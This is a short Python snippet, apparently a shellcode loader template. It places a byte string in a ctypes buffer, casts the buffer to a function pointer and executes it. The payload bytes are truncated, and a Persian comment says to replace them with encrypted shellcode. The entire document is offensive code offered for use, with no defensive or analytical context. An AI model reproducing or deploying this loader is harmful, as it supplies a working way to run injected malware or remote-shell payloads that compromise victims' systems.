import ctypes

shellcode = b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41..."  # شل‌کد رمزگذاری‌شده را جایگزین کنید
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(None))
shellcode_func()
